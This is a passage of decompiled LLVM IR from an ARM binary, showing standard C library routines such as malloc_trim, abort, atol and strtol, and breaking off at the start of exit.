  %v4_137d4 = call i32 @munmap(i32 %v2_137d0, i32 %v2_137bc, i32 %v1_137c0, i32 %v2_137c4)
  store i32 %v4_137d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137d8

dec_label_pc_137d8:                               ; preds = %bb16, %dec_label_pc_13768, %dec_label_pc_137a0, %dec_label_pc_13654, %dec_label_pc_137b0
  store i32 %v2_135e8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_137e4 = load i32, i32* @r7, align 4
  %v2_137e4 = add i32 %v0_137e4, 44
  %v3_137e4 = inttoptr i32 %v2_137e4 to i32*
  %v4_137e4 = load i32, i32* %v3_137e4, align 4
  store i32 %v4_137e4, i32* %ip.global-to-local, align 4
  store i32 79856, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_137e4)
  br label %dec_label_pc_137f0

dec_label_pc_137f0:                               ; preds = %entry, %dec_label_pc_137d8
  store i32 %v3_135dc, i32* @r4, align 4
  store i32 %v6_135dc, i32* @r5, align 4
  store i32 %v9_135dc, i32* @r6, align 4
  store i32 %v12_135dc, i32* @r7, align 4
  store i32 %v18_135dc, i32* @lr, align 4
  ret i32 %v2_135e8

; uselistorder directives
  uselistorder i32 %v0_13788, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13748, { 1, 0 }
  uselistorder i32 %v1_13688, { 1, 0 }
  uselistorder i32 %v0_13688, { 1, 0 }
  uselistorder i32 %v3_1365c, { 1, 0 }
  uselistorder i32 %v1_13640, { 1, 0, 2 }
  uselistorder i32 %v2_1363c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13634, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135e4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 4, 1, 5, 2, 6, 10, 3, 7, 8, 9, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_137f0, { 1, 0 }
  uselistorder label %dec_label_pc_137d8, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13768, { 1, 0 }
  uselistorder label %dec_label_pc_13728, { 1, 0 }
  uselistorder label %dec_label_pc_1371c, { 1, 0 }
  uselistorder label %dec_label_pc_13718, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_136cc, { 1, 0 }
}

define i32 @function_13800(i32 %arg1) local_unnamed_addr {
dec_label_pc_13800:
  %v0_13800 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13800, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13800
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13800, %bb
  %v4_13814 = phi i32 [ %arg1, %dec_label_pc_13800 ], [ 0, %bb ]
  ret i32 %v4_13814

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13818 = load i32, i32* @r4, align 4
  store i32 %v3_13818, i32* %stack_var_-12, align 4
  %v6_13818 = load i32, i32* @r5, align 4
  %v4_13828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_13828, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13828, i32* @r0, align 4
  %v0_13838 = call i32 @__malloc_consolidate()
  %v0_1383c = load i32, i32* @r4, align 4
  %v0_13840 = load i32, i32* @r5, align 4
  %v2_13848 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13848, i32* @r4, align 4
  store i32 %v6_13818, i32* @r5, align 4
  %v2_1384c = call i32 @__malloc_trim(i32 %v0_1383c, i32 %v0_13840)
  %v0_13850 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13850, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13854 = phi i32 [ %v2_1384c, %entry ], [ 0, %bb ]
  ret i32 %v4_13854

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r5, align 4
  %v4_13870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 16) to i32*), align 4
  store i32 79996, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13870)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13898 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_138a0 = load i32, i32* @r5, align 4
  %v2_138a0 = add i32 %v0_138a0, 632
  %v3_138a0 = inttoptr i32 %v2_138a0 to i32*
  %v4_138a0 = load i32, i32* %v3_138a0, align 4
  %v2_138a4 = icmp eq i32 %v4_138a0, 0
  br i1 %v2_138a4, label %dec_label_pc_138ac, label %dec_label_pc_138ec

dec_label_pc_138ac:                               ; preds = %entry
  store i32 1, i32* %v3_138a0, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138fc, %dec_label_pc_138ac
  %v0_138b8 = load i32, i32* @r5, align 4
  %v2_138b8 = add i32 %v0_138b8, 212
  store i32 %v2_138b8, i32* @r4, align 4
  %v2_138c4 = add i32 %v0_138b8, 68
  %v3_138c4 = inttoptr i32 %v2_138c4 to i32*
  %v4_138c4 = load i32, i32* %v3_138c4, align 4
  call void @__pseudo_branch(i32 %v4_138c4)
  %v1_138d4 = call i32 @__GI_raise(i32 6)
  %v0_138e0 = load i32, i32* @r5, align 4
  %v2_138e0 = add i32 %v0_138e0, 16
  %v3_138e0 = inttoptr i32 %v2_138e0 to i32*
  %v4_138e0 = load i32, i32* %v3_138e0, align 4
  store i32 80108, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_138e0)
  %v0_138f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_138ec

dec_label_pc_138ec:                               ; preds = %entry, %dec_label_pc_138b4
  %v1_13904 = phi i32 [ %v0_138a0, %entry ], [ %v0_138f0.pre, %dec_label_pc_138b4 ]
  %v2_138f0 = add i32 %v1_13904, 632
  %v3_138f0 = inttoptr i32 %v2_138f0 to i32*
  %v4_138f0 = load i32, i32* %v3_138f0, align 4
  %v7_138f4 = icmp eq i32 %v4_138f0, 1
  br i1 %v7_138f4, label %dec_label_pc_138fc, label %dec_label_pc_13938

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138ec
  %v2_138fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_138fc, i32* @r4, align 4
  store i32 2, i32* %v3_138f0, align 4
  %v3_13914 = bitcast i32* %stack_var_-28 to i8*
  %v4_13914 = call i32 @__GI_memset(i8* %v3_13914, i32 0, i32 20)
  %v3_13930 = call i32 @__libc_sigaction(i32 6, i32 %v2_138fc, i32 0)
  br label %dec_label_pc_138b4

dec_label_pc_13938:                               ; preds = %dec_label_pc_138ec
  %v7_13938 = icmp eq i32 %v4_138f0, 2
  br i1 %v7_13938, label %dec_label_pc_13940, label %dec_label_pc_1394c

dec_label_pc_13940:                               ; preds = %dec_label_pc_13938
  store i32 3, i32* %v3_138f0, align 4
  %v0_13948 = call i32 @abort()
  %v0_1394c.pre = load i32, i32* @r5, align 4
  %v1_1394c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1394c

dec_label_pc_1394c:                               ; preds = %dec_label_pc_13938, %dec_label_pc_13940
  %v3_13958 = phi i32 [ 632, %dec_label_pc_13938 ], [ %v1_1394c.pre, %dec_label_pc_13940 ]
  %v2_13958 = phi i32 [ %v1_13904, %dec_label_pc_13938 ], [ %v0_1394c.pre, %dec_label_pc_13940 ]
  %v2_1394c = add i32 %v2_13958, %v3_13958
  %v3_1394c = inttoptr i32 %v2_1394c to i32*
  %v4_1394c = load i32, i32* %v3_1394c, align 4
  %v7_13950 = icmp eq i32 %v4_1394c, 3
  br i1 %v7_13950, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1394c
  store i32 4, i32* %v3_1394c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1394c, %bb
  call void @__pseudo_cond_branch(i1 %v7_13950, i32 ptrtoint (i32* @global_var_15530.489 to i32))
  br label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %dec_label_pc_13964, %.thread2
  %v0_13964 = call i32 @abort()
  br label %dec_label_pc_13964

; uselistorder directives
  uselistorder i32* %v3_138f0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1394c, { 1, 0 }
  uselistorder label %dec_label_pc_138ec, { 1, 0 }
}

define i32 @function_13970(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13970:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13970 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13970, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13970
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13970, %bb
  %v4_1397c = phi i32 [ %tmp, %dec_label_pc_13970 ], [ 0, %bb ]
  ret i32 %v4_1397c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13990 = call i32 @strtol()
  ret i32 %v0_13990
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_139ac = call i32 @_stdlib_strto_l()
  ret i32 %v0_139ac
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v0_139d0 = load i32, i32* @r1, align 4
  store i32 %v0_139d0, i32* %sb.global-to-local, align 4
  %v0_139d4 = load i32, i32* @r2, align 4
  store i32 %v0_139d4, i32* %r5.global-to-local, align 4
  %v0_139d8 = load i32, i32* @r0, align 4
  store i32 %v0_139d8, i32* %r4.global-to-local, align 4
  %v0_139dc = load i32, i32* @r3, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139e8
  %v1_139e4 = add i32 %v0_13a20, 1
  store i32 %v1_139e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %entry, %dec_label_pc_139e4
  %v0_13a20 = phi i32 [ %v0_139d8, %entry ], [ %v1_139e4, %dec_label_pc_139e4 ]
  %v1_139e8 = inttoptr i32 %v0_13a20 to i8*
  %v2_139e8 = load i8, i8* %v1_139e8, align 1
  %v3_139e8 = zext i8 %v2_139e8 to i32
  store i32 %v3_139e8, i32* %r1.global-to-local, align 4
  %v4_139ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 276) to i32*), align 4
  %v2_139f0 = mul nuw nsw i32 %v3_139e8, 2
  %v2_139f4 = add i32 %v2_139f0, %v4_139ec
  %v3_139f4 = inttoptr i32 %v2_139f4 to i16*
  %v4_139f4 = load i16, i16* %v3_139f4, align 2
  %v1_139f8 = and i16 %v4_139f4, 32
  %v2_139f8 = icmp eq i16 %v1_139f8, 0
  br i1 %v2_139f8, label %dec_label_pc_13a00, label %dec_label_pc_139e4

dec_label_pc_13a00:                               ; preds = %dec_label_pc_139e8
  %v7_13a00 = icmp eq i8 %v2_139e8, 43
  br i1 %v7_13a00, label %dec_label_pc_13a20, label %dec_label_pc_13a08

dec_label_pc_13a08:                               ; preds = %dec_label_pc_13a00
  %v7_13a08 = icmp eq i8 %v2_139e8, 45
  br i1 %v7_13a08, label %dec_label_pc_13a20, label %bb

bb:                                               ; preds = %dec_label_pc_13a08
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a20:                               ; preds = %dec_label_pc_13a00, %dec_label_pc_13a08
  %storemerge47 = phi i32 [ 1, %dec_label_pc_13a08 ], [ 0, %dec_label_pc_13a00 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_13a20 = add i32 %v0_13a20, 1
  store i32 %v1_13a20, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %bb, %dec_label_pc_13a20
  %v0_13a44 = phi i32 [ %v0_13a20, %bb ], [ %v1_13a20, %dec_label_pc_13a20 ]
  %v1_13a24 = and i32 %v0_139d4, -17
  %v3_13a24 = icmp eq i32 %v1_13a24, 0
  br i1 %v3_13a24, label %dec_label_pc_13a30, label %bb60

bb60:                                             ; preds = %dec_label_pc_13a24
  br label %bb64

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13a24
  %v1_13a30 = inttoptr i32 %v0_13a44 to i8*
  %v2_13a30 = load i8, i8* %v1_13a30, align 1
  %v7_13a34 = icmp eq i8 %v2_13a30, 48
  %v1_13a38 = add i32 %v0_139d4, 10
  store i32 %v1_13a38, i32* %r5.global-to-local, align 4
  br i1 %v7_13a34, label %dec_label_pc_13a44, label %bb61

bb61:                                             ; preds = %dec_label_pc_13a30
  br label %.thread8

dec_label_pc_13a44:                               ; preds = %dec_label_pc_13a30
  %v1_13a44 = add i32 %v0_13a44, 1
  %v2_13a44 = inttoptr i32 %v1_13a44 to i8*
  %v3_13a44 = load i8, i8* %v2_13a44, align 1
  %v4_13a44 = zext i8 %v3_13a44 to i32
  store i32 %v1_13a44, i32* %r4.global-to-local, align 4
  %v1_13a48 = or i32 %v4_13a44, 32
  %v7_13a4c = icmp eq i32 %v1_13a48, 120
  %v1_13a50 = add i32 %v0_139d4, 8
  store i32 %v1_13a50, i32* %r5.global-to-local, align 4
  br i1 %v7_13a4c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_13a44
  %v3_13a5c = mul i32 %v1_13a50, 2
  store i32 %v3_13a5c, i32* %r5.global-to-local, align 4
  %v2_13a60 = add i32 %v0_13a44, 2
  store i32 %v2_13a60, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13a44, %bb61, %bb62
  %v1_13b3430 = phi i32 [ %v0_139d8, %bb61 ], [ %v1_13a44, %bb62 ], [ %v1_13a44, %dec_label_pc_13a44 ]
  %v0_13ab021 = phi i32 [ %v0_13a44, %bb61 ], [ %v2_13a60, %bb62 ], [ %v1_13a44, %dec_label_pc_13a44 ]
  %v0_13a64 = phi i32 [ %v1_13a38, %bb61 ], [ %v3_13a5c, %bb62 ], [ %v1_13a50, %dec_label_pc_13a44 ]
  %v5_13a68 = icmp slt i32 %v0_13a64, 16
  br i1 %v5_13a68, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_13b3429 = phi i32 [ %v0_139d8, %bb60 ], [ %v1_13b3430, %.thread8 ], [ %v1_13b3430, %bb63 ]
  %v0_13ab020 = phi i32 [ %v0_13a44, %bb60 ], [ %v0_13ab021, %.thread8 ], [ %v0_13ab021, %bb63 ]
  %v0_13a90 = phi i32 [ %v0_139d4, %bb60 ], [ %v0_13a64, %.thread8 ], [ 16, %bb63 ]
  %v1_13a6c = add i32 %v0_13a90, -2
  %tmp = icmp ugt i32 %v1_13a6c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13a7c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13a7c:                               ; preds = %bb64
  %v2_13a84 = udiv i32 -1, %v0_13a90
  %v3_13a84 = urem i32 -1, %v0_13a90
  store i32 %v0_13a90, i32* %r1.global-to-local, align 4
  %v1_13a94 = urem i32 %v3_13a84, 256
  store i32 %v1_13a94, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13a84, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13ab0

dec_label_pc_13aac:                               ; preds = %bb71, %dec_label_pc_13b0c
  %v0_13aac = phi i32 [ %v1_13aec44, %bb71 ], [ %v0_13aac.pre, %dec_label_pc_13b0c ]
  br label %dec_label_pc_13ab0

dec_label_pc_13ab0:                               ; preds = %dec_label_pc_13a7c, %dec_label_pc_13aac
  %v1_13b3427 = phi i32 [ %v1_13b3429, %dec_label_pc_13a7c ], [ %v0_13aac, %dec_label_pc_13aac ]
  %v0_13aec = phi i32 [ %v0_13ab020, %dec_label_pc_13a7c ], [ %v0_13aac, %dec_label_pc_13aac ]
  %v1_13ab0 = inttoptr i32 %v0_13aec to i8*
  %v2_13ab0 = load i8, i8* %v1_13ab0, align 1
  %v3_13ab0 = zext i8 %v2_13ab0 to i32
  %v1_13ab4 = add nsw i32 %v3_13ab0, -48
  %v1_13ab8 = urem i32 %v1_13ab4, 256
  store i32 %v1_13ab8, i32* %r1.global-to-local, align 4
  %v1_13ac0 = or i32 %v3_13ab0, 32
  %tmp79 = icmp ult i32 %v1_13ab8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13ac8

dec_label_pc_13ac8:                               ; preds = %dec_label_pc_13ab0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13ac0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13ac8
  %v1_13acc = add nsw i32 %v1_13ac0, -87
  %v5_13ad4 = urem i32 %v1_13acc, 256
  store i32 %v5_13ad4, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13ab0, %dec_label_pc_13ac8, %bb65
  %v3_13b04 = phi i32 [ %v1_13ab8, %dec_label_pc_13ab0 ], [ 40, %dec_label_pc_13ac8 ], [ %v5_13ad4, %bb65 ]
  %v1_13ad8 = load i32, i32* %r5.global-to-local, align 4
  %v6_13adc = icmp slt i32 %v3_13b04, %v1_13ad8
  br i1 %v6_13adc, label %dec_label_pc_13ae0, label %dec_label_pc_13b30.loopexit

dec_label_pc_13ae0:                               ; preds = %bb66
  %v0_13ae0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ae0 = load i32, i32* %r8.global-to-local, align 4
  %v9_13ae0 = icmp eq i32 %v0_13ae0, %v1_13ae0
  br i1 %v9_13ae0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13ae0
  %v1_13aec40 = add i32 %v0_13aec, 1
  store i32 %v1_13aec40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13af4

bb67:                                             ; preds = %dec_label_pc_13ae0
  %v3_13ae0 = icmp ult i32 %v0_13ae0, %v1_13ae0
  %v1_13aec = add i32 %v0_13aec, 1
  store i32 %v1_13aec, i32* %r4.global-to-local, align 4
  br i1 %v3_13ae0, label %dec_label_pc_13af4, label %dec_label_pc_13b0c

dec_label_pc_13af4:                               ; preds = %bb67, %.thread39
  %v1_13aec44 = phi i32 [ %v1_13aec40, %.thread39 ], [ %v1_13aec, %bb67 ]
  %v4_13afc2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13af4 = load i32, i32* %sl.global-to-local, align 4
  %v3_13af4 = icmp uge i32 %v3_13b04, %v1_13af4
  %v9_13af4 = icmp eq i32 %v3_13b04, %v1_13af4
  %v2_13af8 = xor i1 %v3_13af4, true
  %v3_13af8 = or i1 %v9_13af4, %v2_13af8
  br i1 %v3_13af8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13af4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13af4, %bb68
  %v4_13afc = phi i32 [ %v4_13afc2443, %dec_label_pc_13af4 ], [ 0, %bb68 ]
  %v2_13afc = xor i1 %v9_13af4, true
  %v3_13afc = and i1 %v3_13af4, %v2_13afc
  br i1 %v3_13afc, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_13afc = urem i32 %v4_13afc, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13b00 = phi i32 [ %v5_13afc, %bb70 ], [ %v4_13afc, %bb69 ]
  %v2_13b00 = icmp eq i32 %v0_13b00, 0
  br i1 %v2_13b00, label %bb71, label %dec_label_pc_13b0c

bb71:                                             ; preds = %thread-pre-split
  %v4_13b04 = mul i32 %v0_13ae0, %v1_13ad8
  %v5_13b04 = add i32 %v4_13b04, %v3_13b04
  store i32 %v5_13b04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13b0c:                               ; preds = %bb67, %thread-pre-split
  %v0_13b14 = call i32 @__aeabi_read_tp()
  %v0_13b18 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b18 = and i32 %v0_139dc, %v0_13b18
  store i32 %v2_13b18, i32* %r7.global-to-local, align 4
  %v0_13b1c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13b1c, i32* %ip.global-to-local, align 4
  %v3_13b20 = load i16, i16* @global_var_22294.357, align 2
  %v4_13b20 = sext i16 %v3_13b20 to i32
  %v3_13b28 = add i32 %v4_13b20, %v0_13b14
  %v4_13b28 = inttoptr i32 %v3_13b28 to i32*
  store i32 34, i32* %v4_13b28, align 4
  %v0_13aac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13b30.loopexit:                      ; preds = %bb66
  %v0_13b30.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13b30

dec_label_pc_13b30:                               ; preds = %.thread, %dec_label_pc_13b30.loopexit
  %v1_13b34 = phi i32 [ %v1_13b3427, %dec_label_pc_13b30.loopexit ], [ %v1_13b3429, %.thread ]
  %v2_13b34 = phi i32 [ %v0_13b30.pre, %dec_label_pc_13b30.loopexit ], [ %v0_139d0, %.thread ]
  %v2_13b30 = icmp eq i32 %v2_13b34, 0
  br i1 %v2_13b30, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13b30
  %v3_13b34 = inttoptr i32 %v2_13b34 to i32*
  store i32 %v1_13b34, i32* %v3_13b34, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13b30, %bb72
  %v0_13b3c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b3c = icmp eq i32 %v0_13b3c, 0
  %. = select i1 %v2_13b3c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13b48 = icmp eq i32 %v0_139dc, 0
  %v0_13b74.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13b48, label %dec_label_pc_13b6c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13b74.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13b54, label %dec_label_pc_13b6c

dec_label_pc_13b54:                               ; preds = %bb76
  %v0_13b58 = call i32 @__aeabi_read_tp()
  %v3_13b5c = load i16, i16* @global_var_22294.357, align 2
  %v4_13b5c = sext i16 %v3_13b5c to i32
  %v3_13b64 = add i32 %v4_13b5c, %v0_13b58
  %v4_13b64 = inttoptr i32 %v3_13b64 to i32*
  store i32 34, i32* %v4_13b64, align 4
  %v0_13b68 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13b68, i32* %ip.global-to-local, align 4
  %v0_13b6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %bb76, %bb73, %dec_label_pc_13b54
  %v0_13b74.pre = phi i32 [ %v0_13b74.pre.pre, %bb76 ], [ %v0_13b68, %dec_label_pc_13b54 ], [ %v0_13b74.pre.pre, %bb73 ]
  %v0_13b6c = phi i32 [ %v0_13b3c, %bb76 ], [ %v0_13b6c.pre, %dec_label_pc_13b54 ], [ %v0_13b3c, %bb73 ]
  %v2_13b6c = icmp eq i32 %v0_13b6c, 0
  br i1 %v2_13b6c, label %dec_label_pc_13b6c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13b6c
  %v2_13b70 = sub i32 0, %v0_13b74.pre
  store i32 %v2_13b70, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b6c._crit_edge

dec_label_pc_13b6c._crit_edge:                    ; preds = %dec_label_pc_13b6c, %bb77
  %v0_13b74 = phi i32 [ %v2_13b70, %bb77 ], [ %v0_13b74.pre, %dec_label_pc_13b6c ]
  ret i32 %v0_13b74

; uselistorder directives
  uselistorder i32 %v0_13b74.pre, { 1, 0 }
  uselistorder i32 %v0_13b74.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13afc, { 1, 0 }
  uselistorder i1 %v3_13af4, { 1, 0 }
  uselistorder i32 %v1_13af4, { 1, 0 }
  uselistorder i32 %v5_13ad4, { 1, 0 }
  uselistorder i32 %v1_13ac0, { 1, 0 }
  uselistorder i32 %v1_13ab8, { 2, 0, 1 }
  uselistorder i32 %v0_13aec, { 1, 0, 2 }
  uselistorder i32 %v0_13aac, { 1, 0 }
  uselistorder i32 %v3_13a5c, { 1, 0 }
  uselistorder i32 %v1_13a50, { 1, 0, 2 }
  uselistorder i32 %v0_13a44, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13a20, { 0, 1, 3, 2 }
  uselistorder i32 %v0_139dc, { 1, 0 }
  uselistorder i32 %v0_139d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_139d4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 6, 3, 7, 5 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b6c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13b6c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13b30, { 1, 0 }
  uselistorder label %dec_label_pc_13b0c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ab0, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a24, { 1, 0 }
  uselistorder label %dec_label_pc_13a20, { 1, 0 }
  uselistorder label %dec_label_pc_139e8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r5, align 4
  %v4_13ba0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 140) to i32*), align 4
  store i32 %v4_13ba0, i32* @r4, align 4
  %v2_13ba8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13bc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13bc0)
  %v0_13bd4 = load i32, i32* @r5, align 4
  %v2_13bd4 = add i32 %v0_13bd4, 16
  %v3_13bd4 = inttoptr i32 %v2_13bd4 to i32*
  %v4_13bd4 = load i32, i32* %v3_13bd4, align 4
